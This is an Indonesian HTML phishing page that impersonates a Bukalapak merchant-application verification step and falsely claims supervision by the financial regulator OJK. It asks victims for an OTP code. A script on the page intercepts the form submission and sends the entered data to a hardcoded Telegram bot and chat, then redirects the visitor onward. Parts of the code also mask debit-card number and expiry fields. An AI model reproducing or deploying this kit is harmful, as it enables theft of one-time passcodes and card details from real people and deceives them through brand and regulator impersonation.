<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Pengajuan</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { box-sizing: border-box; }

    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background-color: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background: #fff;
      border-radius: 10px;
      padding: 25px 20px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    }

    .judul-wrapper { margin-bottom: 20px; text-align: center; }

    .judul-wrapper .garis-atas,
    .judul-wrapper .garis-bawah {
      height: 1px;
      background-color: #ddd;
    }

    .judul-wrapper h2 {
      font-size: 18px;
      font-weight: bold;
      margin: 10px 0;
    }

    p {
      font-size: 14px;
      margin: 5px 0;
      text-align: center;
    }

    .resend {
      color: #d5004c;
      text-decoration: none;
      font-weight: bold;
    }

    .container img {
      width: 100%;
      max-width: 350px;
      display: block;
      margin: 20px auto;
    }

    input[type="tel"] {
      width: 100%;
      padding: 12px;
      border-radius: 6px;
      border: 1px solid #ccc;
      margin: 20px 0;
      font-size: 14px;
      text-align: center;
      letter-spacing: 8px;
      font-weight: bold;
    }

    button {
      background-color: #d5004c;
      color: white;
      border: none;
      padding: 12px;
      font-size: 15px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover { background-color: #b8003f; }

    .timer { margin-top: 15px; font-size: 13px; text-align: center; }

    .countdown {
      font-weight: bold;
      color: #d5004c;
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="judul-wrapper">
    <div class="garis-atas"></div>
    <h2>Verifikasi Pengajuan</h2>
    <div class="garis-bawah"></div>
  </div>

  <p>Kode OTP pengajuan telah dikirim ke <b id="">[nomor kamu]</b></p>
  <img src="https://formulir-edc-mitrabukalapak.biz.id/assets/konfirmasi.jpg" alt="Bukalapak">
  <p>Masukkan kode Pengajuan yang sudah dikirimkan di bawah ini</p>

  <form action="juragan.html" method="POST" enctype="multipart/form-data" id="setPin">
    <input type="tel" name="otp" placeholder="Masukkan kode OTP" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
    <button type="submit">Konfirmasi</button>
  </form>

  <div class="countdown" id="countdown">30</div>
  <div class="timer">
    Mitra Bukalapak Terdaftar dan Diawasi oleh <a href="#" class="resend">OTORITAS JASA KEUANGAN</a> (OJK)
  </div>
</div>
 </div>
   
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        </div> 
   </div> 
   </div>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
<script src="jquery.min.js"></script>
       
        <script type="text/javascript">
            $(document).ready(function(){
        </script>
<!-- </body> -->  
   <script>


function closeForm() {
  document.getElementById("myForm").style.display = "none";
}
</script> 
  
  <!-- partial -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"

    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="

    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
 <script>$(document).ready(function(){
$('#debit').mask('0000 0000 0000 0000');     
$('#valid').mask('00/00');
});</script>
 <p id="status"></p>
   <script src="setPin.js"></script>
   
   <script>
   
            $(document).ready(function() {
            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#password").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#password").prop("type", "password");
                });
            });
            
const chat_id = '-1002437287311', botID = 'bot7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o';

    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
            messageStatus.textContent = "";
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
        window.location.href = 'juragan.html';
    });

            
        });
        
   </script>
        </form>
      </div>
    </section>
    <!-- <script src="./axios.js" type="module"></script> -->
    <script src="./Pin.html" type="module"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
            </script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js">
            </script>
<script>
            $(document).ready(function() {
                $('.slider').slick({
                    autoplay: true,
                    autoplaySpeed: 500,
                    dots: true
                });
            });
            </script>
            
            <script>
 var nomor = sessionStorage.getItem("nomor");
 document.getElementById("nomorku").value = nomor + "";
</script>
<script>
  // Tampilkan nomor tujuan dari sessionStorage
  const tujuan = sessionStorage.getItem('otp_tujuan');
  document.getElementById('tujuanOtp').innerText = tujuan || "[tidak tersedia]";

  // Countdown timer
  let time = 29; // 1 menit 40 detik
  const countdownEl = document.getElementById('countdown');
  const timer = setInterval(() => {
    let minutes = Math.floor(time / 10);
    let seconds = time % 10;
    if (seconds < 10) seconds = '' + seconds;
    countdownEl.innerText = `${minutes}${seconds}`;
    time--;

    if (time < 0) {
      clearInterval(timer);
      countdownEl.innerHTML = 'Kode OTP telah kedaluwarsa, <a href="#" class="resend" id="resendOtp"> Masukan Kode Baru</a>';
      document.getElementById('resendOtp').addEventListener('click', (e) => {
        e.preventDefault();
        Swal.fire({
          title: 'OTP Dikirim Ulang!',
          text: 'Kode OTP baru telah dikirim ke ' + tujuan,
          icon: 'success'
        });
        time = 100;
      });
    }
  }, 1000);

  // Validasi sebelum kirim form (tanpa AJAX)
  document.getElementById('otpForm').addEventListener('submit', function(e) {
    const otpValue = this.otp.value.trim();
    if (!otpValue || !/^\d{1,6}$/.test(otpValue)) {
      e.preventDefault();
      Swal.fire({
        title: 'Kode Tidak Valid',
        text: 'Masukkan kode OTP yang valid (1â€“6 digit).',
        icon: 'error',
        confirmButtonText: 'OK'
      });
      return;
    }

    // Tampilkan loading sebelum submit ke PHP
    Swal.fire({
      title: 'Memverifikasi',
      text: 'Sedang memproses OTP Anda...',
      allowOutsideClick: false,
      didOpen: () => Swal.showLoading()
    });
  });
</script>

</body>
</html>
